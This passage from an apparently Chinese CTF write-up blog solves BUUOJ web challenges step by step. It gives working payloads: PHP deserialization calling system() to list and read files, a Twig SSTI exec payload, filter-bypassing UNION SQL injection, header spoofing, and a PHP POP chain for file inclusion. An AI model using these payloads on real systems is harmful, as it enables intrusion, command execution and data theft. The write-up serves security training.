class="token operator">==</span> <span class="token double-quoted-string string">"string"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"Y-m-d h:i:s a"</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"date"</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">func</span> <span class="token operator">!=</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token function">gettime</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">func</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">p</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$func</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"func"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$p</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"p"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$func</span> <span class="token operator">!=</span> <span class="token constant">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span><span class="token variable">$disable_fun</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token function">gettime</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Hacker..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>分析发现禁用了不少函数，调用了<code>call_user_func()</code>函数，可能存在命令执行。</p><p><code>gettype()</code>函数限制执行后返回必须为String类型。</p><p>观察发现，本题只对传入参数进行一次waf，代码中还给了个类Test，类中调用<code>gettime()</code>函数不会被waf，于是可用序列化方法，将代码序列化传入，再反序列化执行命令。</p><p>尝试传参</p><pre class="language-none"><code class="language-none">func&#x3D;unserialize&amp;p&#x3D;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:2:&quot;ls&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</code></pre><img src="/article/Buuoj-WEB-Write-up/image-20201210191635044.png" class="" title="image-20201210191635044"><p>再扫根目录文件</p><pre class="language-none"><code class="language-none">func&#x3D;unserialize&amp;p&#x3D;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:4:&quot;ls &#x2F;&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</code></pre><img src="/article/Buuoj-WEB-Write-up/image-20201210192034277.png" class="" title="image-20201210192034277"><p>根目录没发现flag，利用system来找一下，<code>find / -name fla*</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201210192305790.png" class="" title="image-20201210192305790"><p>发现了奇怪的东西，打开即为flag</p><img src="/article/Buuoj-WEB-Write-up/image-20201210192428939.png" class="" title="image-20201210192428939"><p>payload：</p><pre class="language-none"><code class="language-none">func&#x3D;unserialize&amp;p&#x3D;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:22:&quot;cat &#x2F;tmp&#x2F;flagoefiu4r93&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</code></pre><hr><h2 id="BJDCTF-2nd-假猪套天下第一"><a href="#BJDCTF-2nd-假猪套天下第一" class="headerlink" title="[BJDCTF 2nd]假猪套天下第一"></a>[BJDCTF 2nd]假猪套天下第一</h2><h5 id="Http-Header"><a href="#Http-Header" class="headerlink" title="Http Header"></a>Http Header</h5><p>考验http请求头，打开随便登陆底部源码提示<code>&lt;!-- L0g1n.php --&gt;</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201210194805424.png" class="" title="image-20201210194805424"><ol><li>提示<code>Sorry, this site will be available after totally 99 years!</code></li></ol><p>修改Cookie中<code>time=9999999999</code></p><ol start="2"><li>提示<code>Sorry, this site is only optimized for those who comes from localhost</code></li></ol><p>添加<code>X-Forwarded-For: 127.0.0.1</code></p><p>提示<code>Do u think that I dont know X-Forwarded-For?&lt;br&gt;Too young too simple sometimes naive·</code></p><p>添加<code>Client-IP: 127.0.0.1</code></p><ol start="3"><li>提示<code>Sorry, this site is only optimized for those who come from gem-love.com</code></li></ol><p>添加<code>Referer: gem-love.com</code></p><ol start="4"><li>提示<code>Sorry, this site is only optimized for browsers that run on Commodo 64</code></li></ol><p>资料：科摩多64位安全浏览器的UA为 Commodore 64 </p><p>修改<code>User-Agent: Commodore 64</code></p><ol start="5"><li>提示<code>Sorry, this site is only optimized for those whose email is root@gem-love.com</code></li></ol><p>添加<code>Sorry, this site is only optimized for those who use the http proxy of y1ng.vip&lt;br&gt; if you dont have the proxy, pls contact us to buy, ￥100/Month</code></p><ol start="6"><li>提示<code>Sorry, this site is only optimized for those who use the http proxy of y1ng.vip&lt;br&gt; if you dont have the proxy, pls contact us to buy, ￥100/Month</code></li></ol><p>添加<code>Via: y1ng.vip</code></p><p>提示</p><pre class="language-none"><code class="language-none">Sorry, even you are good at http header, you&#39;re still not my admin.&lt;br&gt; Althoungh u found me, u still dont know where is flag &lt;!--&#123;一段base64编码&#125;--&gt;</code></pre><p>base64解码注释得flag，可能原题这边只是给下一题的方向，没有直接给flag，这边做题简单化了吧…</p><p>最终payload：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">GET</span> <span class="token operator">/</span>L0g1n<span class="token punctuation">.</span>php <span class="token constant">HTTP</span><span class="token operator">/</span><span class="token number">1.1</span>Host<span class="token punctuation">:</span> node3<span class="token punctuation">.</span>buuoj<span class="token punctuation">.</span>cn<span class="token punctuation">:</span><span class="token number">26256</span>Cache<span class="token operator">-</span>Control<span class="token punctuation">:</span> max<span class="token operator">-</span>age<span class="token operator">=</span><span class="token number">0</span>Upgrade<span class="token operator">-</span>Insecure<span class="token operator">-</span>Requests<span class="token punctuation">:</span> <span class="token number">1</span>User<span class="token operator">-</span>Agent<span class="token punctuation">:</span> Commodore <span class="token number">64</span> text<span class="token operator">/</span>html<span class="token punctuation">,</span>application<span class="token operator">/</span>xhtml<span class="token operator">+</span>xml<span class="token punctuation">,</span>application<span class="token operator">/</span>xml<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>image<span class="token operator">/</span>webp<span class="token punctuation">,</span>image<span class="token operator">/</span>apng<span class="token punctuation">,</span><span class="token operator">*</span><span class="token operator">/</span><span class="token operator">*</span><span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.8</span><span class="token punctuation">,</span>application<span class="token operator">/</span>signed<span class="token operator">-</span>exchange<span class="token punctuation">;</span>v<span class="token operator">=</span>b3<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span>Accept<span class="token operator">-</span>Encoding<span class="token punctuation">:</span> gzip<span class="token punctuation">,</span> deflateAccept<span class="token operator">-</span>Language<span class="token punctuation">:</span> zh<span class="token operator">-</span><span class="token constant">CN</span><span class="token punctuation">,</span>zh<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span>Cookie<span class="token punctuation">:</span> UM_distinctid<span class="token operator">=</span><span class="token number">1762</span>cb225c986d<span class="token operator">-</span><span class="token number">0970</span>f0908a83e6<span class="token operator">-</span><span class="token number">3323766</span><span class="token operator">-</span><span class="token number">144000</span><span class="token operator">-</span><span class="token number">1762</span>cb225ca565<span class="token punctuation">;</span> <span class="token constant">PHPSESSID</span><span class="token operator">=</span>qo3u19su6i7oha2lte6grem4t6<span class="token punctuation">;</span> time<span class="token operator">=</span><span class="token number">9999999999</span>Connection<span class="token punctuation">:</span> close<span class="token constant">X</span><span class="token operator">-</span>Forwarded<span class="token operator">-</span><span class="token keyword">For</span><span class="token punctuation">:</span> <span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span>Client<span class="token operator">-</span><span class="token constant">IP</span><span class="token punctuation">:</span> <span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span>Referer<span class="token punctuation">:</span> gem<span class="token operator">-</span>love<span class="token punctuation">.</span>comFrom<span class="token punctuation">:</span> root@gem<span class="token operator">-</span>love<span class="token punctuation">.</span>comVia<span class="token punctuation">:</span> y1ng<span class="token punctuation">.</span>vip</code></pre><img src="/article/Buuoj-WEB-Write-up/image-20201210195920865.png" class="" title="image-20201210195920865"><hr><h2 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h2><h5 id="SSTI模板注入"><a href="#SSTI模板注入" class="headerlink" title="SSTI模板注入"></a>SSTI模板注入</h5><img src="/article/Buuoj-WEB-Write-up/image-20201213144912657.png" class="" title="image-20201213144912657"><p>ID测试，不是SQL注入，测试<code>&#123;&#123;1+1&#125;&#125;</code></p><p>返回<code>2</code>，确认SSTI</p><img src="/article/Buuoj-WEB-Write-up/image-20201213145018456.png" class="" title="image-20201213145018456"><p>根据流程，测试<code>&#123;&#123;2*'1'&#125;&#125;</code></p><p>输出<code>49</code></p><p>确认为Twig模板引擎</p><p>直接打Payload：</p><p><code>&#123;&#123;_self.env.registerUndefinedFilterCallback("exec")&#125;&#125;&#123;&#123;_self.env.getFilter("cat /f*")&#125;&#125;</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201213145633846.png" class="" title="image-20201213145633846"><hr><h2 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h2><p>注册，登陆，尝试SSTI没有，最后在广告标题处发现SQL注入</p><p>过滤<code> </code>,<code>+</code>,<code>or</code>,<code>and</code>等</p><p>空格用<code>/**/</code>替换</p><p>尝试爆列数，好家伙，22列</p><pre class="language-none"><code class="language-none">1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;</code></pre><p>回显点在2,3</p><p>查一下数据库名</p><pre class="language-none"><code class="language-none">1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;</code></pre><img src="/article/Buuoj-WEB-Write-up/image-20201213173543614.png" class="" title="image-20201213173543614"><p>库名web1</p><p>因为ban了<code>or</code>,所以<code>information_schema</code>,这时有<code>mysql.innodb_table_stats</code>，mysql默认是关闭InnoDB存储引擎 ，仅 Mysql&gt;5.6.x 可使用</p><p><a href="https://mariadb.com/kb/en/mysqlinnodb_table_stats/">mariadb链接</a></p><p>查表</p><pre class="language-none"><code class="language-none">1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;</code></pre><img src="/article/Buuoj-WEB-Write-up/image-20201213173634852.png" class="" title="image-20201213173634852"><p>表名<code> FLAG_TABLE</code>,<code>news</code>,<code>users</code>,<code>gtid_slave_pos</code>,<code>ads</code>,<code>users </code></p><h5 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h5><pre class="language-none"><code class="language-none">1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(a)&#x2F;**&#x2F;from(select&#x2F;**&#x2F;1,2,3&#x2F;**&#x2F;as&#x2F;**&#x2F;a&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;*&#x2F;**&#x2F;from&#x2F;**&#x2F;users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;</code></pre><p>原型</p><pre class="language-none"><code class="language-none">1&#39;union select 1,(select group_concat(a) from(select 1,2,3 as a union select * from users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;</code></pre><p>2处是回显点，所以对2出注入，首先联合查询</p><p>然后分析<code>(select group_concat(a) from(select 1,2,3 as a union select * from users)x)</code></p><p>确认users列在web1中，慢慢试，无列名注入表的列数不相同会报错，最后发现users里有三列 </p><p>采用的子查询的方式，子查询是将一个查询语句嵌套在另一个查询语句中，在特定的情况下，一个查询语句的条件需要另一个查询语句来获取，内层查询语句的查询结果，可以为外层查询语句提供查询条件。 </p><p><code>(select 1,2,3 as a union select * from users)</code></p><p>将users这个表里面的查询的结果提供给外部查询，同时把列名转换成a，直接<code>group_concat(a)</code>可得结果</p><img src="/article/Buuoj-WEB-Write-up/image-20201213175809048.png" class="" title="image-20201213175809048"><hr><h2 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h2><h5 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h5><p>先上源码</p><pre class="language-php" data-language="php"><code class="language-php">Welcome to index.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//flag is in flag.php</span><span class="token comment">//WTF IS THIS?</span><span class="token comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span><span class="token comment">//And Crack It!</span><span class="token keyword">class</span> <span class="token class-name">Modifier</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span>  <span class="token variable">$var</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">append</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">append</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">Show</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token single-quoted-string string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token single-quoted-string string">'Welcome to '</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">str</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/gopher|http|file|ftp|https|dict|\.\./i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token double-quoted-string string">"hacker"</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"index.php"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">p</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$function</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">p</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    @<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>三个类</p><p><code>Modifier</code>，<code>Show</code>，<code>Test</code></p><p>逐个分析，首先路口题目给了从<code>Show</code>，可能不对，但还是先从<code>Show</code>看</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Show</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token single-quoted-string string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token single-quoted-string string">'Welcome to '</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">str</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/gopher|http|file|ftp|https|dict|\.\./i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token double-quoted-string string">"hacker"</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"index.php"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>三个魔术方法</p><pre class="language-php" data-language="php"><code class="language-php">__construct：当一个对象创建时调用__toString：当一个对象被当作一个字符串被调用__wakeup：反序列化时触发</code></pre><p>从<code>Show</code>入口，会调用<code>__wakeup</code>魔术方法，方法里将<code>$this-&gt;source</code>做字符串在<code>preg_match</code>函数里比较， 如果<code>$this-&gt;source</code>是Show类，这时会调用<code>__toString</code>方法。</p><p>再看<code>Modifier</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Modifier</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span>  <span class="token variable">$var</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">append</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">append</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>一个魔术方法</p><pre class="language-none"><code class="language-none">__invoke：将对象调用为函数时触发</code></pre><p>很明显的文件包含<code>include</code>，这个类就是最终要读取<code>flag.php</code>的时候使用的了，我们要让<code>Modifier</code>被当做函数调用，这时就会调用<code>__invoke</code>方法，从而调用<code>append</code>函数，进行文件包含。</p><p>最后看<code>Test</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">p</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$function</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">p</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>两个魔术方法</p><pre class="language-none"><code class="language-none">__construct：当一个对象创建时调用__get：用于从不可访问的属性读取数据</code></pre><p>很关键的<code>__get</code>魔术方法，这里会返回<code>$this-&gt;p</code>即<code>$function()</code>作为函数调用，而我们恰好需要让<code>Modifier</code>被当做函数调用，只要在<code>Show</code>里实例化<code>Test</code>类，这样一来一条pop链就形成了。</p><h6 id="pop链"><a href="#pop链" class="headerlink" title="pop链"></a>pop链</h6><p>从<code>Show</code>入手，先反序列化函数触发<code>Show</code>类中<code>__wakeup</code>方法，方法内调用函数触发<code>__tosring</code>方法，<code>__tosring</code>中将<code>str</code>实例化为<code>Test</code>类，而<code>Test</code>类中没有<code>source</code>属性，所以会调用<code>__get</code>方法， 将<code>function</code>实例化为<code>Modifier</code>类，触发<code>Modifier</code>中的<code>__invoke</code>方法，最终调用<code>include</code>函数文件包含<code>flag.php</code></p><p>payload:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">Modifier</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$var</span><span class="token operator">=</span><span class="token double-quoted-string string">"php://filter/convert.base64-encode/resource=flag.php"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">Show</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token double-quoted-string string">"123"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//Show()->__wakeup()->__tostring()->str->Test->__get()->Modefier->__invoke()->"flag.php"</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"123"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">str</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">str</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">p</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Modifier</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token 